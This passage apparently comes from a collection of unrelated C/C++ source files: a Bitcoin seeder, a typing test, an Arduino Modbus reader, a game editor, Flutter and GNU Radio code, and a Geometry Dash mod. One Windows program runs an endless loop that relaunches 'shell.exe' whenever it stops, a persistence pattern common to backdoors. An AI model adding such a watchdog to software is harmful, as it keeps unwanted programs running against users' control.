strCommand, CDataStream& vRecv) {\n//    printf(\"%s: RECV %s\\n\", ToString(you).c_str(), strCommand.c_str());\n    if (strCommand == \"version\") {\n      int64 nTime;\n      CAddress addrMe;\n      CAddress addrFrom;\n      uint64 nNonce = 1;\n      vRecv >> nVersion >> you.nServices >> nTime >> addrMe;\n      if (nVersion == 10300) nVersion = 300;\n      if (nVersion >= 106 && !vRecv.empty())\n        vRecv >> addrFrom >> nNonce;\n      if (nVersion >= 106 && !vRecv.empty())\n        vRecv >> strSubVer;\n      if (nVersion >= 209 && !vRecv.empty())\n        vRecv >> nStartingHeight;\n      \n      if (nVersion >= 209) {\n        BeginMessage(\"verack\");\n        EndMessage();\n      }\n      vSend.SetVersion(min(nVersion, PROTOCOL_VERSION));\n      if (nVersion < 209) {\n        this->vRecv.SetVersion(min(nVersion, PROTOCOL_VERSION));\n        GotVersion();\n      }\n      return false;\n    }\n    \n    if (strCommand == \"verack\") {\n      this->vRecv.SetVersion(min(nVersion, PROTOCOL_VERSION));\n      GotVersion();\n      return false;\n    }\n    \n    if (strCommand == \"addr\" && vAddr) {\n      vector<CAddress> vAddrNew;\n      vRecv >> vAddrNew;\n      // printf(\"%s: got %i addresses\\n\", ToString(you).c_str(), (int)vAddrNew.size());\n      int64 now = time(NULL);\n      vector<CAddress>::iterator it = vAddrNew.begin();\n      if (vAddrNew.size() > 1) {\n        if (doneAfter == 0 || doneAfter > now + 1) doneAfter = now + 1;\n      }\n      while (it != vAddrNew.end()) {\n        CAddress &addr = *it;\n//        printf(\"%s: got address %s\\n\", ToString(you).c_str(), addr.ToString().c_str(), (int)(vAddr->size()));\n        it++;\n        if (addr.nTime <= 100000000 || addr.nTime > now + 600)\n          addr.nTime = now - 5 * 86400;\n        if (addr.nTime > now - 604800)\n          vAddr->push_back(addr);\n//        printf(\"%s: added address %s (#%i)\\n\", ToString(you).c_str(), addr.ToString().c_str(), (int)(vAddr->size()));\n        if (vAddr->size() > 1000) {doneAfter = 1; return true; }\n      }\n      return false;\n    }\n    \n    return false;\n  }\n  \n  bool ProcessMessages() {\n    if (vRecv.empty()) return false;\n    do {\n      CDataStream::iterator pstart = search(vRecv.begin(), vRecv.end(), BEGIN(pchMessageStart), END(pchMessageStart));\n      int nHeaderSize = vRecv.GetSerializeSize(CMessageHeader",
    "// WRITTEN BY:  Keenan Mayuga and Margarita Bautista\r\n// SECTION: EQ1       \r\n//                \r\n// FOR COURSE:    LBYEC2B\r\n//\r\n// PURPOSE:\r\n// This program assess the typing speed and accuracy of the user.\r\n//\r\n// OVERALL METHOD/ALGORITHM:\r\n// The list of general tasks is:\r\n// 1. Display a main menu and ask the user to select.\r\n// 2. Execute the menu item.\r\n//    2-1. If selected menu item is '1', perform register\r\n//         2-1-1. Asks the user to enter first name, last name, username, and password\r\n//         2-1-2. If the registration is successful, the main menu will be shown again. \r\n//         2-1-3. If the the user attempts to register with the same username and password, \r\n//                a message will appear telling the user that the user already exists and is ask \r\n//                whether to go back to the main menu or try again\r\n//                2-1-3-1. If selected menu item is 'x' or 'X', display main menu\r\n//                2-1-3-2. If selected menu item is 'y' or 'Y', asks for a username again.\r\n//    2-2. If selected menu item is '2', perform login\r\n//         2-2-1. If the login is successful, display usermenu to select.\r\n//                2-2-1-1. If selected menu item is '1', display text selection menu and ask the user to select\r\n//                         2-2-1-1-1. Display the chosen text\r\n//                         2-2-1-1-2. Ask the user the number of lines to be typed\r\n//                         2-2-1-1-3. Ask the user to start typing\r\n//                         2-2-1-1-4. Display the results (number of words correct, number of words incorrect, \r\n//                                    accuracy, typing time, and speed)\r\n//                2-2-1-2. If selected menu item is '2', display the profile of the user\r\n//                2-2-1-3. If selected menu item is '3', display the statistics of mistyped words\r\n//                2-2-1-4. If selected menu item is '4', logout and display main menu\r\n//                2-2-1-5. If selected menu item is '5', exit the program\r\n//         2-2-2. If the username is not verified, a message will appear\r\n//                telling the user that the user does not exists and is asked whether to go back to main menu\r\n//                or try again\r\n//                2-2-2-1. If selected menu item is 'x' or 'X', display main menu\r\n//                2-2-2-2. If selected menu item is 'y' or 'Y', asks for a username again \r\n//         2-2-3. If the password is incorrect, a message will appear telling the user that the password is incorrect \r\n//                is asked whether to go back to main menu or try again\r\n//                2-2-3-1. If selected menu item is 'x' or 'X', display main menu\r\n//                2-2-3-2. If selected menu item is 'y' or 'Y', asks for a password again \r\n//         \r\n//    2-3. If selected menu item is '3', exit the program\r\n//\r\n// CREDITS:\r\n//     https://github.com/iamsahil1910/Typing-Test\r\n// \r\n// FUNCTIONS:\r\n//\r\n// main_menu\r\n//    display the menu\r\n//\r\n// reg\r\n//    ask user to register\r\n//\r\n// login\r\n//    ask user to login\r\n//\r\n// usermenu\r\n//    display the menu for the game\r\n//\r\n// myprofile\r\n//    displays the past records of the user\r\n// \r\n// listTest\r\n//    display menu for text selection\r\n//\r\n// Test\r\n//    executes the typing game and shows the result\r\n//\r\n// Statistics\r\n//    displays statistics of mistyped words\r\n//\r\n// INCLUDED FILES:\r\n//    typing.h\r\n//\r\n// DATA FILES:\r\n//    username.txt\r\n//    check.txt\r\n//    mistake.txt\r\n#include \"typing.h\"\r\n\r\nType game;\r\n\r\nType *start = NULL, *last = NULL;\r\n\r\n// FUNCTION NAME: main_menu\r\n// CREDITS:\r\n//           \r\n// PARAMETERS: None\r\n//\r\n// RETURN VALUE: None          \r\n//\r\n// CALLS TO: none\r\n//\r\n// CALLED FROM: main()\r\n//\r\n// METHOD:\r\n//\r\n// This function displays the main menu\r\nvoid main_menu()\r\n{\r\n\tint choice;//menu key variable\r\n\tdo\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\t\tprintf(\"\\t      __    _____ _____    _____ _____ \\n\");\r\n\t\tprintf(\"\\t     |  |  |     |   __|  |     |   | |\\n\");\r\n\t\tprintf(\"\\t     |  |__|  |  |  |  |  |-   -| | | |\\n\");\r\n\t\tprintf(\"\\t     |_____|_____|_____|  |_____|_|___|\\n\");\r\n\t\tprintf(\"\\n*************************** TYPING TEST ******************************\\n\");\t\r\n\t\tprintf(\"=========================== LOG IN ==================================\\n\");\r\n\t\tprintf(\"(1) Register\\n\");\r\n\t\tprintf(\"(2) Log In\\n\");\r\n\t\tprintf(\"(3) Exit\\n\");\r\n\t\tprintf(\"Enter Choice: \");\r\n\t\tchoice = getch() - 48;\r\n\t\r\n\t\tswitch(choice)\r\n\t\t{\r\n\t\t\tcase 1:\r\n\t\t\t\t{\r\n\t\t\t\t\tgame.reg();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\tcase 2:\r\n\t\t\t\t{\r\n\t\t\t\t\tgame.login();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\tcase 3:\r\n\t\t\t\t{\r\n\t\t\t\t\texit(0);\r\n\t\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\\n Invalid input.\");\r\n\t\t\t\t}\r\n\t\t}\r\n\t}\r\n\twhile (choice != '3'); //if the choice is not 3, redisplay the menu\r\n}\r\n\r\n// FUNCTION NAME: reg\r\n// CREDITS:\r\n//    Ken Camacho\r\n//    https://www.crazyengineers.com/threads/user-login-and-registration-using-files-in-c.55378\r\n//           \r\n// PARAMETERS: None\r\n//\r\n// RETURN VALUE: None          \r\n//\r\n// CALLS TO: none\r\n//\r\n",
    "#include <LiquidCrystal_I2C.h>\n#include <ModbusRTU.h>\n#include <SoftwareSerial.h>\n\n\n#define TX_G16 16\n#define RX_G17 17\n\n#define TX_G26 26\n#define RX_G27 27\nint lcdColumns = 16;\nint lcdRows = 2;\n// #define RE_DE_ENABLE 15\n\nfloat InttoFloat(uint16_t Data0, uint16_t Data1){\n  float x;\n  unsigned long *p;\n\n  p = (unsigned long*)&x;\n  *p = (unsigned long)Data0 << 16 | Data1; //Bid-endian\n  return (x);\n}\nSoftwareSerial S(RX_G27, TX_G26); // RX, TX\nSoftwareSerial mySerialLora(TX_G16, RX_G17); //TX, RX\nModbusRTU mb;\nLiquidCrystal_I2C lcd(0x27, lcdColumns, lcdRows);  \n\nbool cb(Modbus::ResultCode event, uint16_t transactionId, void* data){\n  if(event != Modbus::EX_SUCCESS){\n    Serial.print(\"Request result : 0x\");\n    Serial.print(event, HEX);\n  }\n  return true;\n}\n\nvoid setup() {\n  Serial.begin(9600);\n  mySerialLora.begin(9600);\n  S.begin(19200, SWSERIAL_8E1);\n  mb.begin(&S);\n  mb.master();\n  lcd.init();                    \n  lcd.backlight();\n}\n\nuint16_t data[2];\nvoid loop() {\n\n  if (!mb.slave()){\n    mb.readHreg(2, 3960, data, 2, cb);\n    while(mb.slave()) {\n      mb.task();\n      delay(100);\n    }\n\n    Serial.print(\"Register Values \");\n    Serial.print(data[0]);\n    Serial.print(\",\");\n    Serial.println(data[1]);\n\n    float Data= InttoFloat(data[1],data[0]);\n    Serial.print(\"Data= \");\n    Serial.print(Data);\n    Serial.println(\" Satuan\");\n    mySerialLora.println(\"line-cam-housing;\" + String(Data) + \";\");\n    lcd.setCursor(0, 0);\n    lcd.print(\"Data : \");\n    lcd.setCursor(0,1);\n    lcd.print(Data);\n  }\n  delay(10000);\n  lcd.clear();\n}\n",
    "// SowSeedMng.cpp: implementation of the CSowSeedMng class.\n//\n//////////////////////////////////////////////////////////////////////\n\n#include \"stdafx.h\"\n#include \"MainFrm.h\"\n#include \"MapMng.h\"\n#include \"../N3Base/N3Shape.h\"\n\n#include \"SowSeedMng.h\"\n#include \"DlgSowSeed.h\"\n#include \"DlgShapeList.h\"\n\nCSowSeedMng::CSowSeedMng()\n{\n\tGrass_Group.clear();\n\tbActive = FALSE;\n\tptSelHeightMapPos.x = 0;\n\tptSelHeightMapPos.y = 0;\n\tGrass = NULL;\n\tGrass_Count = 0;\n\tRender_Grass = FALSE;\n\tSelect_Group_Id = -1;\n\tAdd_List_Count = 0;\n\n\tm_pVertices = new __VertexColor[8];\n};\nCSowSeedMng::~CSowSeedMng()\n{\n\tRelease();\n};\n\nvoid CSowSeedMng::Release()\n{\n\tit_Grass_Group it = Grass_Group.begin();\n\tfor( int i = 0 ; i < Grass_Group.size(); i++,it++)\n\t{\n\t\tLPGRASS_GROUP group = (LPGRASS_GROUP)*it;\n\t\tit_Grass it_grass = group->grass.begin();\n\t\tfor( int j = 0 ; j < group->grass.size(); j++, it_grass++)\n\t\t{\n\t\t\tLPGRASS grass = *it_grass;\n\t\t\tif( grass != NULL)\n\t\t\t\tdelete[] grass;\n\t\t}\n\t\tgroup->grass.clear();\n\t\tif( group != NULL)\n\t\t\tdelete group;\n\t}\n\tGrass_Group.clear();\n\n\n\tif( Grass != NULL)\n\t{\n\t\tfor( i = 0; i <Grass_Count ; i ++)\n\t\t{\n\t\t\t\tif(Grass[i].Sub_Grass != NULL)\n\t\t\t\t\tdelete Grass[i].Sub_Grass;\n\t\t}\n\t\tdelete Grass;\n\t}\n\n\tObj_Name.clear();\n\n\n};\n\nvoid CSowSeedMng::SetActive(BOOL flage)\n{\n\tbActive = flage;\n};\nBOOL CSowSeedMng::MouseMessage(LPMSG pMsg)\n{\n\tif( bActive == FALSE)\n\t\treturn FALSE;\n\n\tstatic int\tiPrevScreenY = 0;\n\tconst float fDelta = 0.10f;\n\tstatic int\tiSumOfEditedHeight=0;\t// \uc774\ubc88 \ub4dc\ub798\uadf8\ub85c \ubcc0\ud654\ub41c \uc9c0\ud615\ub192\uc774\uc758 \ud569\n\tCMainFrame* pFrame = (CMainFrame*)AfxGetMainWnd();\n\n\tswitch(pMsg->message)\n\t{\n\tcase WM_MOUSEMOVE:\n\t\t{\n\t\t\tDWORD nFlags = pMsg->wParam;\n\t\t\tPOINT point = {short(LOWORD(pMsg->lParam)), short(HIWORD(pMsg->lParam))};\n\n\t\t\tif( pFrame->m_pDlgSowSeed->Sow_Select_Flage == CS_SOW)\n\t\t\t{\n\t\t\t\t// \ube0c\ub7ec\uc2dc \uc5c5\ub370\uc774\ud2b8 \n\t\t\t\tif(pFrame->GetMapMng()->GetTerrain()->Pick(point.x, point.y, NULL, &ptSelHeightMapPos))\n\t\t\t\t\tpFrame->GetMapMng()->GetTerrain()->UpdateBrushArea(ptSelHeightMapPos);\n\t\t\t}\n\t\t\telse\n\t\t\tif( pFrame->m_pDlgSowSeed->Sow_Select_Flage == CS_SELECT)\n\t\t\t{\n\t\t\t}\n\n\t\t}\n\t\treturn TRUE;\n\tcase WM_LBUTTONDOWN:\n\t\t{\n\t\t\tPOINT point = {short(LOWORD(pMsg->lParam)), short(HIWORD(pMsg->lParam))};\n\t\t\tif( pFrame->m_pDlgSowSeed->Sow_Select_Flage == CS_SOW)\n\t\t\t{\n\t\t\t\tRender_Grass = FALSE;\n\t\t\t\tAdd_Grass();\n\t\t\t}\n\t\t\telse\n\t\t\tif( pFrame->m_pDlgSowSeed->Sow_Select_Flage == CS_SELECT)\n\t\t\t{\n\t\t\t\tSelect_Group_Id = SelectSeed(point);\n\t\t\t\tif( Select_Group_Id >= 0)\n\t\t\t\t{\n\t\t\t\t\tSetListPos();\n\t\t\t\t}\n\n\t\t\t}\n\t\t}\n\t\treturn TRUE;\n\tcase WM_LBUTTONUP:\n\t\t{\n\t\t}\n\t\treturn TRUE;\n\t}\n\treturn TRUE;\n};\n\nvoid CSowSeedMng::Create_Grass(int Num)\n{\n\tif( Grass != NULL)\n\t\tdelete[] Grass;\n\n\tGrass = (LPGRASS) new GRASS[Num];\n\tGrass_Count = Num;\n\n\tfor( int i = 0 ; i < Grass_Count ;i++)\n\t{\n\t\tGrass[i].Tile_x = -1;\n\t\tGrass[i].Tile_z = -1;\n\t\tGrass[i].Pos = __Vector3(0.0f,0.0f,0.0f);\n\t\tGrass[i].Sub_Grass = NULL;\n\t\tGrass[i].Sub_Grass_Count = 0;\n\t}\n};\n\nvoid CSowSeedMng::Random_Grass(void)\n{\n\tCMainFrame* pFrame = (CMainFrame*)AfxGetMainWnd();\n\tfor (int i = 0,Num = 0 ; i < MAX_BRUSH_SIZE ; ++i)\n\t{\n\t\tfor (int j = 0 ; j < MAX_BRUSH_SIZE ; ++j)\n\t\t{\n\t\t\tif(pFrame->GetMapMng()->GetTerrain()->m_fBrushIntensityMap[i][j] <= 0) \n\t\t\t\tcontinue;\n\n//\t\t\tif(pFrame->m_pDlgSowSeed->Sow_Array[i][j] == 0)\n//\t\t\t\tcontinue;\n\n//\t\t\tif( (pFrame->m_pDlgSowSeed->Sow_Array[i][j] == 2) || (pFrame->m_pDlgSowSeed->Sow_Array[i][j] == 1))\n\t\t\t{\n\t\t\t\tif( Grass[Num].Sub_Grass != NULL)\n\t\t\t\t{\n\t\t\t\t\tdelete[] Grass[Num].Sub_Grass;\n\t\t\t\t\tGrass[Num].Sub_Grass = NULL;\n\t\t\t\t}\n\n\t\t\t\tGrass[Num].Sub_Grass_Count = rand() % pFrame->m_pDlgSowSeed->SowDetail;\n\t\t\t\tGrass[Num].Sub_Grass = (LPGRASS) new GRASS[Grass[Num].Sub_Grass_Count];\n\t\t\t\tfor( int k = 0 ; k < Grass[Num].Sub_Grass_Count ; k ++)\n\t\t\t\t{\n\t\t\t\t\tint rad = rand() % 4;\n\t\t\t\t\tif( rad == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\tGrass[Num].Sub_Grass[k].Detx = (rand()%20)*0.1f;\n\t\t\t\t\t\tGrass[Num].Sub_Grass[k].Detz = (rand()%20)*0.1f;\n\t\t\t\t\t\tGrass[Num].roll = rand() % 360;\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\tif( rad == 1)\n\t\t\t\t\t{\n\t\t\t\t\t\tGrass[Num].Sub_Grass[k].Detx =-(rand()%20)*0.1f;\n\t\t\t\t\t\tGrass[Num].Sub_Grass[k].Detz = (rand()%20)*0.1f;\n\t\t\t\t\t\tGrass[Num].roll = rand() % 360;\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\tif( rad == 2)\n\t\t\t\t\t{\n\t\t\t\t\t\tGrass[Num].Sub_Grass[k].Detx =-(rand()%20)*0.1f;\n\t\t\t\t\t\tGrass[Num].Sub_Grass[k].Detz =-(rand()%20)*0.1f;\n\t\t\t\t\t\tGrass[Num].roll = rand() % 360;\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\tif( rad == 3)\n\t\t\t\t\t{\n\t\t\t\t\t\tGrass[Num].Sub_Grass[k].Detx = (rand()%20)*0.1f;\n\t\t\t\t\t\tGrass[Num].Sub_Grass[k].Detz =-(rand()%20)*0.1f;\n\t\t\t\t\t\tGrass[Num].roll = rand() % 360;\n\t\t\t\t\t}\n\n\t\t\t\t\tGrass[Num].Sub_Grass[k].Sub_Grass = NULL;\n\t\t\t\t}\n\t\t\t\tNum++;\n\t\t\t}\n\n\t\t}\n\t}\n\tRender_Grass = TRUE;\n};\n\nvoid CSowSeedMng::Render(LPDIRECT3DDEVICE8 lpD3DDevice)\n{\n\tif( bActive == FALSE)\n\t{\n\t\treturn;\n\t}\n\tint i,j,Num=0;\n\tCMainFrame* pFrame = (CMainFrame*)AfxGetMainWnd();\n\n\n\tif( pFrame->m_pDlgSowSeed->Sow_Select_Flage == CS_SOW)\n\t{\n\t\t// \ube0c\ub7ec\uc2dc\uc5d0 \uc120\ud0dd\ub41c \ud480 \n\t\tif( Render_Grass == TRUE)\n\t\t{\n\t\t\tpFrame->GetMapMng()->GetTerrain()->RenderBrushArea();\n\t\t\tfor (i = 0,Num = 0 ; i < MAX_BRUSH_SIZE ; ++i)\n\t\t\t{\n\t\t\t\tfor (j = 0 ; j < MAX_BRUSH_SIZE ; ++",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"graphical_primitives\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <windows.h>\n#include <tlhelp32.h>    //\u8fdb\u7a0b\u5feb\u7167\u51fd\u6570\u5934\u6587\u4ef6\n#include <stdio.h>\n\nbool getProcess(const char *procressName) {              //\u6b64\u51fd\u6570\u8fdb\u7a0b\u540d\u4e0d\u533a\u5206\u5927\u5c0f\u5199\n\tchar pName[MAX_PATH];                                //\u548cPROCESSENTRY32\u7ed3\u6784\u4f53\u4e2d\u7684szExeFile\u5b57\u7b26\u6570\u7ec4\u4fdd\u6301\u4e00\u81f4\uff0c\u4fbf\u4e8e\u6bd4\u8f83\n\tstrcpy(pName, procressName);                           //\u62f7\u8d1d\u6570\u7ec4\n\tCharLowerBuff(pName, MAX_PATH);                       //\u5c06\u540d\u79f0\u8f6c\u6362\u4e3a\u5c0f\u5199\n\tPROCESSENTRY32 currentProcess;                        //\u5b58\u653e\u5feb\u7167\u8fdb\u7a0b\u4fe1\u606f\u7684\u4e00\u4e2a\u7ed3\u6784\u4f53\n\tcurrentProcess.dwSize = sizeof(currentProcess);        //\u5728\u4f7f\u7528\u8fd9\u4e2a\u7ed3\u6784\u4e4b\u524d\uff0c\u5148\u8bbe\u7f6e\u5b83\u7684\u5927\u5c0f\n\tHANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //\u7ed9\u7cfb\u7edf\u5185\u7684\u6240\u6709\u8fdb\u7a0b\u62cd\u4e00\u4e2a\u5feb\u7167\n\n\tif (hProcess == INVALID_HANDLE_VALUE) {\n\t\tprintf(\"CreateToolhelp32Snapshot()\u8c03\u7528\u5931\u8d25!\\n\");\n\t\treturn false;\n\t}\n\n\tbool bMore = Process32First(hProcess, &currentProcess);     //\u83b7\u53d6\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\u4fe1\u606f\n\twhile (bMore) {\n\t\tCharLowerBuff(currentProcess.szExeFile, MAX_PATH);       //\u5c06\u8fdb\u7a0b\u540d\u8f6c\u6362\u4e3a\u5c0f\u5199\n\t\tif (strcmp(currentProcess.szExeFile, pName) == 0) {       //\u6bd4\u8f83\u662f\u5426\u5b58\u5728\u6b64\u8fdb\u7a0b\n\t\t\tCloseHandle(hProcess);                                //\u6e05\u9664hProcess\u53e5\u67c4\n\t\t\treturn true;\n\t\t}\n\t\tbMore = Process32Next(hProcess, &currentProcess);         //\u904d\u5386\u4e0b\u4e00\u4e2a\n\t}\n\n\tCloseHandle(hProcess);    //\u6e05\u9664hProcess\u53e5\u67c4\n\treturn false;\n}\n\nint main() {\n\twhile (1) {\n\t\tif (!getProcess(\"shell.exe\")) {\n\t\t\tShellExecuteA(0, \"open\", \"shell.exe\", 0, 0, 0);\n\t\t\tShellExecuteA(0, \"open\", \"shell.exe\", 0, 0, 0);\n\t\t\tShellExecuteA(0, \"open\", \"shell.exe\", 0, 0, 0);\n\t\t}\n\t}\n\treturn 0;\n}\n",
    "#include <Geode/Geode.hpp>\n#include <Geode/modify/MenuLayer.hpp>\n#include <Geode/modify/ItemInfoPopup.hpp>\n#include <Geode/modify/GJGarageLayer.hpp>\n#include <Geode/modify/GameManager.hpp>\n\nusing namespace geode::prelude;\n\n#define DEFAULT_CUBE 484\n#define DEFAULT_SHiP 169\n#define DEFAULT_BALL 118\n#define DEFAULT_UFO 149\n#define DEFAULT_WAVE 96\n#define DEFAULT_ROBOT 68\n#define DEFAULT_SPIDER 69\n#define DEFAULT_SWING 43\n#define DEFAULT_JETPACK 5\n\nint cubeCount = 0;\nint shipCount = 0;\nint ballCount = 0;\nint ufoCount = 0;\nint waveCount = 0;\nint robotCount = 0;\nint spiderCount = 0;\nint swingCount = 0;\nint jetpackCount = 0;\n\nvoid updateCounts()\n{\n\tcubeCount = Mod::get()->getSettingValue<int64_t>(\"cube-count\");\n\tshipCount = Mod::get()->getSettingValue<int64_t>(\"ship-count\");\n\tballCount = Mod::get()->getSettingValue<int64_t>(\"ball-count\");\n\tufoCount = Mod::get()->getSettingValue<int64_t>(\"ufo-count\");\n\twaveCount = Mod::get()->getSettingValue<int64_t>(\"wave-count\");\n\trobotCount = Mod::get()->getSettingValue<int64_t>(\"robot-count\");\n\tspiderCount = Mod::get()->getSettingValue<int64_t>(\"spider-count\");\n\tswingCount = Mod::get()->getSettingValue<int64_t>(\"swing-count\");\n\tjetpackCount = Mod::get()->getSettingValue<int64_t>(\"jetpack-count\");\n}\n\n$execute {\n\tupdateCounts();\n}\n\nclass $modify (GameManager)\n{\n\tstatic int countForType(IconType p0)\n\t{\n\t\tupdateCounts();\n\n\t\tif (p0 == IconType::Cube)\n\t\t\treturn cubeCount;\n\n\t\tif (p0 == IconType::Ship)\n\t\t\treturn shipCount;\n\n\t\tif (p0 == IconType::Ball)\n\t\t\treturn ballCount;\n\n\t\tif (p0 == IconType::Ufo)\n\t\t\treturn ufoCount;\n\n\t\tif (p0 == IconType::Wave)\n\t\t\treturn waveCount;\n\n\t\tif (p0 == IconType::Robot)\n\t\t\treturn robotCount;\n\n\t\tif (p0 == IconType::Spider)\n\t\t\treturn spiderCount;\n\n\t\tif (p0 == IconType::Swing)\n\t\t\treturn swingCount;\n\n\t\tif (p0 == IconType::Jetpack)\n\t\t\treturn jetpackCount;\n\n\t\treturn GameManager::countForType(p0);\n\t}\n\n\tbool isIconUnlocked(int p0, IconType p1)\n\t{\n\t\tif (p1 == IconType::Cube && p0 > DEFAULT_CUBE)\n\t\t\treturn true;\n\n\t\tif (p1 == IconType::Ship && p0 > DEFAULT_SHiP)\n\t\t\treturn true;\n\n\t\tif (p1 == IconType::Ball && p0 > DEFAULT_BALL)\n\t\t\treturn true;\n\n\t\tif (p1 == IconType::Ufo && p0 > DEFAULT_UFO)\n\t\t\treturn true;\n\n\t\tif (p1 == IconType::Wave && p0 > DEFAULT_WAVE)\n\t\t\treturn true;\n\n\t\tif (p1 == IconType::Robot && p0 > DEFAULT_ROBOT)\n\t\t\treturn true;\n\n\t\tif (p1 == IconType::Spider && p0 > DEFAULT_SPIDER)\n\t\t\treturn true;\n\n\t\tif (p1 == IconType::Swing && p0 > DEFAULT_SWING)\n\t\t\treturn true;\n\n\t\tif (p1 == IconType::Jetpack && p0 > DEFAULT_JETPACK)\n\t\t\treturn true;\n\n\t\treturn GameManager::isIconUnlocked(p0, p1);\n\t}\n};\n\nclass $modify (ItemInfoPopup)\n{\n\tbool init(int p0, UnlockType p1)\n\t{\n\t\tif (!ItemInfoPopup::init(p0, p1))\n\t\t\treturn false;\n\n\t\tauto lbl = getChildOfType<TextArea>(m_mainLayer, 0);\n\t\tauto title = getChildOfType<CCLabelBMFont>(m_mainLayer, -1);\n\n\t\tif (!lbl || !title)\n\t\t\treturn true;\n\n\t\tif (p1 == UnlockType::Cube && p0 > DEFAULT_CUBE)\n\t\t{\n\t\t\ttitle->setString(\"Custom Cube\");\n\t\t\tlbl->setString(\"This <cg>Cube</c> has been added by a <cl>texture pack</c>.\");\n\t\t}\n\n\t\tif (p1 == UnlockType::Ship && p0 > DEFAULT_SHiP)\n\t\t{\n\t\t\ttitle->setString(\"Custom Ship\");\n\t\t\tlbl->setString(\"This <cg>Ship</c> has been added by a <cl>texture pack</c>.\");\n\t\t}\n\n\t\tif (p1 == UnlockType::Ball && p0 > DEFAULT_BALL)\n\t\t{\n\t\t\ttitle->setString(\"Custom Ball\");\n\t\t\tlbl->setString(\"This <cg>Ball</c> has been added by a <cl>texture pack</c>.\");\n\t\t}\n\n\t\tif (p1 == UnlockType::Bird && p0 > DEFAULT_UFO)\n\t\t{\n\t\t\ttitle->setString(\"Custom Ufo\");\n\t\t\tlbl->setString(\"This <cg>Ufo</c> has been added by a <cl>texture pack</c>.\");\n\t\t}\n\n\t\tif (p1 == UnlockType::Dart && p0 > DEFAULT_WAVE)\n\t\t{\n\t\t\ttitle->setString(\"Custom Wave\");\n\t\t\tlbl->setString(\"This <cg>Wave</c> has been added by a <cl>texture pack</c>.\");\n\t\t}\n\n\t\tif (p1 == UnlockType::Robot && p0 > DEFAULT_ROBOT)\n\t\t{\n\t\t\ttitle->setString(\"Custom Robot\");\n\t\t\tlbl->setString(\"This <cg>Robot</c> has been added by a <cl>texture pack</c>.\");\n\t\t}\n\n\t\tif (p1 == UnlockType::Robot && p0 > DEFAULT_SPIDER)\n\t\t{\n\t\t\ttitle->setString(\"Custom Spider\");\n\t\t\tlbl->setString(\"This <cg>Spider</c> has been added by a <cl>texture pack</c>.\");\n\t\t}\n\n\t\tif (p1 == UnlockType::Robot && p0 > DEFAULT_SPIDER)\n\t\t{\n\t\t\ttitle->setString(\"Custom Swing\");\n\t\t\tlbl->setString(\"This <cg>Swing</c> has been added by a <cl>texture pack</c>.\");\n\t\t}\n\n\t\tif (p1 == UnlockType::Jetpack && p0 > DEFAULT_JETPACK)\n\t\t{\n\t\t\ttitle->setString(\"Custom Jetpack\");\n\t\t\tlbl->setString(\"This <cg>Jetpack</c> has been added by a <cl>texture pack</c>.\");\n\t\t}\n\n\n\t\treturn true;\n\t}\n};",
    "#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/additive_scrambler.hpp>\n#include <gnuradio-4.0/packet-modem/head.hpp>\n#include <gnuradio-4.0/packet-modem/null_source.hpp>\n#include <gnuradio-4.0/packet-modem/pdu_to_tagged_stream.hpp>\n#include <gnuradio-4.0/packet-modem/random_source.hpp>\n#include <gnuradio-4.0/packet-modem/stream_to_tagged_stream.hpp>\n#include <gnuradio-4.0/packet-modem/tagged_stream_to_pdu.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <boost/ut.hpp>\n#include <array>\n\nstatic constexpr std::array<uint8_t, 255> ccsds_scrambling_sequence = {\n    1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0,\n    0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0,\n    1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1,\n    1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0,\n    0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0,\n    1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0,\n    1, 0, 1, 